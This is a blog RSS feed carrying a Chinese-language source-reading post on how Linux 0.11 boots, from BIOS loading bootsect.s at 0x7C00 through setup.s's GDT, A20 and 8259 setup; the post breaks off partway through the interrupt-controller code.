<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>s0uthwood&#39;s Blog</title>
        <link>/</link>
        <description>Recent content on s0uthwood&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sun, 23 Oct 2022 02:41:13 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>RTFSC-Linux0.11 Part1: From BIOS to main</title>
        <link>/post/rtfsc-linux-part1-from-bios-to-main/</link>
        <pubDate>Sun, 23 Oct 2022 02:41:13 +0800</pubDate>
        
        <guid>/post/rtfsc-linux-part1-from-bios-to-main/</guid>
        <description>&lt;img src="/post/rtfsc-linux-part1-from-bios-to-main/cover.jpg" alt="Featured image of post RTFSC-Linux0.11 Part1: From BIOS to main" /&gt;&lt;p&gt;跟着大佬的文章读一下 Linux 0.11 的源码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;github.com/sunym1993/flash-linux0.11-talk&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;万事开头难-bootsectss&#34;&gt;万事开头难 (bootsects.s)&lt;/h2&gt;
&lt;h3 id=&#34;从-0x7c00-开始的操作系统启动&#34;&gt;从 0x7C00 开始的操作系统启动&lt;/h3&gt;
&lt;p&gt;开机首先会执行主板上的 BIOS 程序，BIOS 将启动区的 512 字节（一个扇区）复制到内存中的 &lt;code&gt;0x7C00&lt;/code&gt; 地址，随后跳转到这个地址继续执行&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;启动区的识别：0 盘 0 道 1 扇区的 512 字节最后两个字节为 &lt;code&gt;55 AA&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以操作系统将从第一扇区启动，这在源码中对应了 &lt;code&gt;boot/bootsect.s&lt;/code&gt; 文件&lt;/p&gt;
&lt;p&gt;最开始的两行源码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov ax, 0x07C0
mov ds, ax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将 &lt;code&gt;ds&lt;/code&gt; 寄存器赋值为 &lt;code&gt;0x7C0&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为了能够在 16 位实模式下访问 20 位的地址，在读取段寄存器时需要 &lt;code&gt;&amp;lt;&amp;lt; 4&lt;/code&gt;，所以 &lt;code&gt;ds&lt;/code&gt; 是 &lt;code&gt;0x7C0&lt;/code&gt; 时对应了地址 &lt;code&gt;0x7C00&lt;/code&gt;，指向了此时代码段的地址，方便了后续对内存的访问&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;给自己挪个地方&#34;&gt;给自己挪个地方&lt;/h3&gt;
&lt;p&gt;随后执行：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov ax, 0x9000
mov es, ax
mov cx, #256
sub si, si
sub di, di
rep movw
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前面两行和最开始的两行类似，将 &lt;code&gt;es&lt;/code&gt; 寄存器赋值为 &lt;code&gt;0x9000&lt;/code&gt;，随后 &lt;code&gt;cx = 0x100; si = 0; di = 0&lt;/code&gt;，最后循环执行 movw 指令&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;rep&lt;/code&gt; 指令执行次数取决于 &lt;code&gt;cx&lt;/code&gt;，配合&lt;code&gt;movw&lt;/code&gt; 指令从 &lt;code&gt;ds&lt;/code&gt; 复制到 &lt;code&gt;es&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里就将 &lt;code&gt;0x7C00&lt;/code&gt; 处的 512 字节（256 WORDS）复制到了 &lt;code&gt;0x90000&lt;/code&gt; 处&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;jmpi go, 0x9000
go:
  mov ax, cs
  ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;相当于 &lt;code&gt;jmp go+0x90000&lt;/code&gt;，配合一下上面的复制指令，虽然执行的指令与实际地址后面这条指令相同，但实际地址已经挪过去了&lt;/p&gt;
&lt;p&gt;正所谓《给自己挪个地方》&lt;/p&gt;
&lt;h3 id=&#34;一些基础工作&#34;&gt;一些基础工作&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;go&lt;/code&gt; 后面的指令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;go:
  mov ax, cs
  mov ds, ax
  mov es, ax
  mov ss, ax
  mov sp, #0xFF00
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之前 &lt;code&gt;jmpi&lt;/code&gt; 指令后，&lt;code&gt;cs&lt;/code&gt; 寄存器就被复制为 &lt;code&gt;0x9000&lt;/code&gt;，随后将 &lt;code&gt;ds, es, ss&lt;/code&gt; 都赋值为了 &lt;code&gt;0x9000&lt;/code&gt;，栈顶地址则被赋值为 &lt;code&gt;ss:sp=0x9FF00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;简单画一下目前的内存情况&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+-----------------+ 0x90000 &amp;lt;- cs, ds, es, ss
|  mov ax, 0x7c0  |
|     ......      |
| mov sp, #0xFF00 |
|     next i      | &amp;lt;- ip
|     ......      |
+-----------------+
|     stack       |
+-----------------+ 0x9FF00 &amp;lt;- ss:sp
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;把硬盘里的其他部分也挪过来&#34;&gt;把硬盘里的其他部分也挪过来&lt;/h3&gt;
&lt;p&gt;在完成基本工作后&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;load_setup:
  mov dx, #0x0000   ; drive 0, head 0
  mov cx, #0x0002   ; sector 2, track 0
  mov bx, #0x0200   ; address = 512, in 0x9000
  mov ax, #0x0200+SETUPLEN ; SETUPLEN = 4, service 2, nr of sectors
  int 0x13          ; read it
  jnc ok_load_setup ; ok - continue
  mov dx, #0x0000
  mov ax, #0x0000   ; reset the diskette
  int 0x13
  j   load_setup

ok_load_setup:
  ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;int 0x13&lt;/code&gt; 是 BIOS 中的中断，在这里执行了 BIOS 中读取磁盘的程序，结合上面设置好的参数，就是将 2 ~ 5 扇区的内容（setup.s 程序）读取到 0x90200 内存中，由于该中断具体实现在 BIOS 中，此处只关注结果即可&lt;/p&gt;
&lt;p&gt;随后继续执行 &lt;code&gt;ok_load_setup&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;ok_load_setup:
  ; Get disk drive parameters, specifically nr of sectors/track
  ...
  ; Print some inane message
  ...
  ; Load the system (at 0x10000)
  mov ax, #0x1000
  mov es, ax
  call read_it    ; This routine loads the system at address 0x10000, making sure no 64KB boundaries are crossed.
  ; Check which root-device to use
  ...
  ; jump to the setup-routine loaded directly after the bootblock
  jmpi 0, SETUPSEG ; SETUPSEG = 0x9020
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;省略的代码和主要逻辑无关（参考省略号前的注释），主要用于输出 &lt;code&gt;Loading system&lt;/code&gt; 等内容&lt;/p&gt;
&lt;p&gt;这几行代码主要是执行了 &lt;code&gt;read_it&lt;/code&gt; 函数，将第 6 扇区开始的 240 个扇区读取到 &lt;code&gt;0x10000&lt;/code&gt; 地址（剩余全部代码，开头为 head.s），具体的原理与此前相似，最后跳转到 &lt;code&gt;0x90200&lt;/code&gt; 执行第二扇区的代码&lt;/p&gt;
&lt;p&gt;此时的内存&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+------------+ &amp;lt;- 0x7C00
| bootsect.s |
+------------+
|    ...     |
+------------+ &amp;lt;- 0x10000
|   head.s   |
|            |
|   system   |
|            |
|            |
+------------+
|    ...     |
+------------+ &amp;lt;- 0x90000
| bootsect.s |
+------------+ &amp;lt;- 0x90200
|            |
|  setup.s   |
|            |
+------------+
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;接下来就跳转到 setup.s 程序了，在第一个程序中，一个最明显的特征就是所有的地址都是写死的，比如从第 1 扇区挪到固定的地址 &lt;code&gt;0x7C00&lt;/code&gt;，再挪到固定的地址 &lt;code&gt;0x90000&lt;/code&gt;，最后把剩下的东西也挪到固定的地址 &lt;code&gt;0x90200&lt;/code&gt; 和 &lt;code&gt;0x10000&lt;/code&gt;，这些地址都是写死的，不能出现任何偏差，简单总结就是“强耦合”，把前后执行的每一条指令与相应的内存都安排好了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;继续启动-setups&#34;&gt;继续启动 (setup.s)&lt;/h2&gt;
&lt;h3 id=&#34;保护模式前的准备&#34;&gt;保护模式前的准备&lt;/h3&gt;
&lt;p&gt;上一段程序最后跳转到了 &lt;code&gt;0x90200&lt;/code&gt;，也就是 setup.s 中的代码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;start:
  mov ax, #0x9000 ; this is done in bootsect already, but...
  mov ds, ax
  mov ah, #0x03   ; read cursor pos
  xor bh, bh
  int 0x10        ; save it in  known place, con_init fetches
  mov [0], dx     ; it from 0x90000.
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;吐槽一下，前面清零用的是 &lt;code&gt;sub ax, ax&lt;/code&gt;，这里怎么就用 &lt;code&gt;xor ax, ax&lt;/code&gt; 了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;int 0x10 中断仍然是 BIOS 中的中断，用于显示服务，当 &lt;code&gt;AH = 3&lt;/code&gt; 时，用于获取光标的位置与形态，并保存到 &lt;code&gt;dx&lt;/code&gt; 寄存器中，其中 &lt;code&gt;dh&lt;/code&gt; 保存了行号，&lt;code&gt;dl&lt;/code&gt; 保存了列号&lt;/p&gt;
&lt;p&gt;最终将结果保存至了 &lt;code&gt;0x90000&lt;/code&gt; 地址，用于后续初始化控制台&lt;/p&gt;
&lt;p&gt;后续的代码都是在干类似的事情，获取环境的信息，然后保存到内存中&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; Get memory size (extended mem, kB)
mov ah, #0x88
int 0x15
mov [2], ax

; Get vedio-card data:
mov ah, #0x0F
int 0x10
mov [4], bx   ; bh = display page
mov [6], ax   ; al = video mode, ah = window width

; Check for EGA/VGA and some config parameters
mov ah, #0x12
mov bl, #0x10
int 0x10
mov [8], ax
mov [10], bx
mov [12], cx

; Get hd0 data
mov ax, #0x0000
mov ds, ax
lds si, [4 * 0x41]
mov ax, #INITSEG
mov es, ax
mov di, #0x0080
mov cx, #0x10
rep movsb

; Get hd1 data
mov ax, #0x0000
mov ds, ax
lds si, [4 * 0x46]
mov ax, #INITSEG  ; INITSET = 0x9000
mov es, ax
mov di, #0x0090
mov cx, #0x10
rep movsb

; Check that there IS a hd1
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;依次获取了内存、显卡、显示方式、硬盘等信息，都是在调用 BIOS 中断并保存，没必要细看了，最后的内存如下表所示&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;addr&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;length&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;info&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90000&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;光标位置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90002&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;扩展内存数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90004&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;显示页面&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90006&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;显示模式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90007&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符列数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90008&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;未知&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x9000A&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;显示内存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x9000B&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;显示状态&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x9000C&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;显卡特性参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x9000E&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;屏幕行数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x9000F&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;屏幕列数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90080&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;硬盘0参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x90090&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;硬盘1参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x901FC&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;根设备号&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;这些地址也都是约定好的，后面需要用的时候从这里获取即可&lt;/p&gt;
&lt;p&gt;接下来需要为进入保护模式做准备了&lt;/p&gt;
&lt;p&gt;首先是关闭中断&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; now we want to move to protected mode ...
cli       ; no interrupts allowed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;BIOS 中断至此就不再调用了，接下来会用操作系统的中断覆盖此前 BIOS 提供的中断向量表&lt;/p&gt;
&lt;p&gt;不过首先我们需要将操作系统移动到正确的地址&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; first we move the system to it&#39;s rightful place
mov ax, #0x0000
cld                 ; &#39;direction&#39;=0, movs moves forward
do_move:
  mov es, ax        ; destination segment
  add ax, #0x1000
  cmp ax, #0x9000
  jz end_move
  mov ds, ax        ; source segment
  sub di, di
  sub si, si
  mov cx, #0x8000
  rep movsw
  jmp do_move

; then we load the segment descriptors
end_move:
  ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里做的操作与之前从 &lt;code&gt;0x7C00&lt;/code&gt; 挪到 &lt;code&gt;0x90000&lt;/code&gt; 是类似的，这里的效果就是将 &lt;code&gt;0x10000 ~ 0x90000&lt;/code&gt; 的内存（后 240 个扇区的代码）移动到 &lt;code&gt;0x0 ~ 0x80000&lt;/code&gt;（用了个 &lt;code&gt;while&lt;/code&gt; 循环，每次挪 &lt;code&gt;0x10000&lt;/code&gt; 字节）&lt;/p&gt;
&lt;h3 id=&#34;段寄存器的历史包袱&#34;&gt;段寄存器的历史包袱&lt;/h3&gt;
&lt;p&gt;实模式下的段基址：&lt;/p&gt;
&lt;p&gt;$[ds:3] = (ds &amp;laquo; 4) + 3$&lt;/p&gt;
&lt;p&gt;保护模式下的段保护子则复杂多了，因为使用了分段机制，该机制下段&lt;strong&gt;寄存器中存放的是段选择子，使用段选择子到段描述符表（GDT, Global Descriptor Table）中找到所需要的段描述符，段描述符中存放的是真正的段基址，该地址再加上偏移得到物理地址&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Linear Address Space
+------------------+ &amp;lt;- GDTR (a register)
| Descriptor Table |
|                  |
|                  |
|                  |
|  +------------+  |
|  | Descriptor |&amp;lt;-|------------+
|  +------------+  |            |
|        |         |            |
+------------------+            |
         |                      |
         V                  Selector:Offset (Logical Address)
+------------------+                   |
|     Segment      |                   |
|                  |                   |
|  +------------+  |                   |
|  |    Data    |&amp;lt;-|-------------------+
|  +------------+  |
|                  |
|                  |
|                  |
|                  |
+------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以，要想进入保护模式，必须要对寻址部分进行初始化&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; Then we load the segment descriptors
lidt idt_48   ; load idt with 0, 0
lgdt gdt_48   ; load gdt with whatever appropriate
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在源码末尾可以看到 &lt;code&gt;idt_48&lt;/code&gt; 和 &lt;code&gt;gdt_48&lt;/code&gt; 的定义&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;idt_48:
  .word 0     ; idt limit = 0
  .word 0, 0  ; idt base = 0L

gdt_48:
  .word 0x800 ; gdt limit = 0x800, 256 GDT entries
  .word 512+gdt, 0x9  ; get base = 0x9XXXX
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里 &lt;code&gt;gdt_48&lt;/code&gt; 是一个 48 位数据，其中，高 32 位存储了全局描述符表 gdt 的内存地址，低 16 位则为表界限&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gdt_48:
high                low
+-------------+-------+
| 00 09 xx xx | 08 00 |
+-------------+-------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里 &lt;code&gt;gdt&lt;/code&gt; 的地址手动加上了 &lt;code&gt;0x90200&lt;/code&gt; 的偏移&lt;/p&gt;
&lt;p&gt;指令 &lt;code&gt;lgdt&lt;/code&gt; 的用处就是将 &lt;code&gt;gdt&lt;/code&gt; 位置信息存入 &lt;code&gt;gdtr&lt;/code&gt; 寄存器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gdt&lt;/code&gt; 标签也在源码的最后，这就是 &lt;code&gt;gdt&lt;/code&gt; 表中的真实数据了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gdt:
  .word 0, 0, 0, 0  ; dummy
  .word 0x07FF      ; 8Mb - limit=2047 (2048 * 4096 = 8Mb)
  .word 0x0000      ; base address = 0
  .word 0x9A00      ; code read/exec
  .word 0x00C0      ; granularity=4096, 386

  .word 0x07FF      ; 8Mb - limit=2047 (2048 * 4096 = 8Mb)
  .word 0x0000      ; base address = 0
  .word 0x9200      ; data read/exec
  .word 0x00C0      ; granularity=4096, 386
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里写了三个段描述符，段描述符的具体结构如下 (from Wiki Pedia)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 659; 
			flex-basis: 1581px&#34;
	&gt;
	&lt;a href=&#34;/post/rtfsc-linux-part1-from-bios-to-main/image/580px-SegmentDescriptor.svg.png&#34; data-size=&#34;580x88&#34;&gt;
		&lt;img src=&#34;/post/rtfsc-linux-part1-from-bios-to-main/image/580px-SegmentDescriptor.svg.png&#34;
			width=&#34;580&#34;
			height=&#34;88&#34;
			srcset=&#34;/post/rtfsc-linux-part1-from-bios-to-main/image/580px-SegmentDescriptor.svg_hu2b038b0c8fa95279f40e8bc916b89d61_11617_480x0_resize_box_3.png 480w, /post/rtfsc-linux-part1-from-bios-to-main/image/580px-SegmentDescriptor.svg_hu2b038b0c8fa95279f40e8bc916b89d61_11617_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Base Address
&lt;ul&gt;
&lt;li&gt;Starting memory address of the segment. Its length is 32 Bit and it is created of the lower Part Bit 16 to 31, and the upper Part Bit 0 to 7, followed by Bit 24 to 31.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Segment Limit
&lt;ul&gt;
&lt;li&gt;Its length is 20 bit and is created of the lower Part Bit 0 to 15 and the upper Part Bit 16 to 19. It defines the address of the last accessible data. The length is one more than the value stored here. How exactly this should be interpreted depends on the Granularity bit of the segment descriptor.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;G=Granularity
&lt;ul&gt;
&lt;li&gt;If clear, the limit is in units of bytes, with a maximum of 220 bytes. If set, the limit is in units of 4096-byte pages, for a maximum of 232 bytes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;D/B
&lt;ul&gt;
&lt;li&gt;D = Default operand size : If clear, this is a 16-bit code segment; if set, this is a 32-bit segment.&lt;/li&gt;
&lt;li&gt;B = Big: If set, the maximum offset size for a data segment is increased to 32-bit 0xffffffff. Otherwise it&amp;rsquo;s the 16-bit max 0x0000ffff. Essentially the same meaning as &amp;ldquo;D&amp;rdquo;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;L=Long
&lt;ul&gt;
&lt;li&gt;If set, this is a 64-bit segment (and D must be zero), and code in this segment uses the 64-bit instruction encoding. &amp;ldquo;L&amp;rdquo; cannot be set at the same time as &amp;ldquo;D&amp;rdquo; aka &amp;ldquo;B&amp;rdquo;. (Bit 21 in the image)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AVL=Available
&lt;ul&gt;
&lt;li&gt;For software use, not used by hardware (Bit 20 in the image with the label A)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;P=Present
&lt;ul&gt;
&lt;li&gt;If clear, a &amp;ldquo;segment not present&amp;rdquo; exception is generated on any reference to this segment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DPL=Descriptor privilege level
&lt;ul&gt;
&lt;li&gt;Privilege level (ring) required to access this descriptor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type
&lt;ul&gt;
&lt;li&gt;If set, this is a code segment descriptor. If clear, this is a data/stack segment descriptor, which has &amp;ldquo;D&amp;rdquo; replaced by &amp;ldquo;B&amp;rdquo;, &amp;ldquo;C&amp;rdquo; replaced by &amp;ldquo;E&amp;quot;and &amp;ldquo;R&amp;rdquo; replaced by &amp;ldquo;W&amp;rdquo;. This is in fact a special case of the 2-bit type field, where the preceding bit 12 cleared as &amp;ldquo;0&amp;rdquo; refers to more internal system descriptors, for LDT, LSS, and gates.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;C=Conforming
&lt;ul&gt;
&lt;li&gt;Code in this segment may be called from less-privileged levels.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;E=Expand-Down
&lt;ul&gt;
&lt;li&gt;If clear, the segment expands from base address up to base+limit. If set, it expands from maximum offset down to limit, a behavior usually used for stacks.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;R=Readable
&lt;ul&gt;
&lt;li&gt;If clear, the segment may be executed but not read from.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;W=Writable
&lt;ul&gt;
&lt;li&gt;If clear, the data segment may be read but not written to.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A=Accessed
&lt;ul&gt;
&lt;li&gt;This bit is set to 1 by hardware when the segment is accessed, and cleared by software.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;根据上述信息，可以对应到三个描述符&lt;/p&gt;
&lt;p&gt;第一个为空&lt;/p&gt;
&lt;p&gt;根据高 22 位 (B/D) 表示代码段或数据段，可知第二个为代码段描述符，第三个为数据段描述符，基址均为 0（这样设置，在保护模式的寻址结果中，物理地址与逻辑地址完全相同）&lt;/p&gt;
&lt;p&gt;另一个重要的东西是 &lt;code&gt;idt&lt;/code&gt; （中断描述符表），同样有一个 &lt;code&gt;idtr&lt;/code&gt; 指向 &lt;code&gt;idt&lt;/code&gt;，原理与 &lt;code&gt;gdt&lt;/code&gt; 相同，此处指令暂时将 &lt;code&gt;idtr&lt;/code&gt; 清空了，后面才会重新设置&lt;/p&gt;
&lt;p&gt;在进入保护模式前，再看一下此时的内存情况：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+--------------+ &amp;lt;- 0x00000
|    system    |
| from 6 ~ 246 |
+--------------+ &amp;lt;- 0x80000
|     ...      |
+--------------+ &amp;lt;- 0x90000
|  Some  Data  |
+--------------+ &amp;lt;- 0x90200
|              |
|   setup.s    |
|     idt      | &amp;lt;- idtr
|     gdt      | &amp;lt;- gdtr
|              |
+--------------+
|     ...      |
+--------------+
|     Stack    |
+--------------+ &amp;lt;- 0x9FF00
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;保护模式漫长的前摇简单的切换&#34;&gt;保护模式：漫长的前摇，简单的切换&lt;/h3&gt;
&lt;p&gt;赋值完 &lt;code&gt;idtr&lt;/code&gt; 和 &lt;code&gt;gdtr&lt;/code&gt; 后，要打开 &lt;code&gt;A20&lt;/code&gt; 地址线&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; that was painless, now we enable A20
call empty_8042
mov al, #0xD1     ; command write
out #0x64, al
call empty_8042
mov al, #0xDF     ; A20 on
out #0x60, al
call empty_8042
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;about &lt;code&gt;empty_8042&lt;/code&gt;: This routine checks that the keyboard command queue is empty. No timeout is used - if this hangs there is someting wrong with the machine, and we probably couldn&amp;rsquo;t proceed anyway.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简单来说就是检查输入缓冲区是否为空，可以忽略&lt;/p&gt;
&lt;p&gt;打开 &lt;code&gt;A20&lt;/code&gt; 地址线这里其实又是对 CPU 的控制了，32 位 CPU 考虑到兼容性，必须手动设置才能开启 32 位模式，这里就是手动设置环节&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; Now we have to reprogram the interrupts.
; We put them right after the intel-reserved hardware interrupts, at int 0x20-0x2F.
; There they won&#39;t mess up anything.
; Sadly IBM really messed this up with the original PC, and they haven&#39;t been able to rectify it afterwards.
; Thus th bios puts interrupts at 0x08-0x0F, witch is used for the internal hardware interrupts as well.
; We just have to reprogram the 8259&#39;s, and it isn&#39;t fun.

  mov al,#0x11        ; initialization sequence
                      ; 其中 0x11 表示初始化命令的开始，ICW1 命令字，表示边沿触发、多片 8259 级连，最后发送 ICW4 命令字
  out #0x20,al        ; send it to 8259A-1
                      ; 将命令发送至芯片 8259A-1
  .word   0x00eb,0x00eb       ; jmp $+2, jmp $+2
                      ; 这两条指令相当于 nop，用于延时，直接用机器语言的写法挺有意思
  out #0xA0,al        ; and to 8259A-2
                      ; 同样也给 8259A-2 芯片
  .word   0x00eb,0x00eb
  mov al,#0x20        ; start of hardware int&#39;s (0x20)
  out #0x21,al        ; 这里 0x21 是 8259A-1（主芯片），0xA1 是 8259A-2（从芯片）
                      ; 设置起始中断号为 0x20
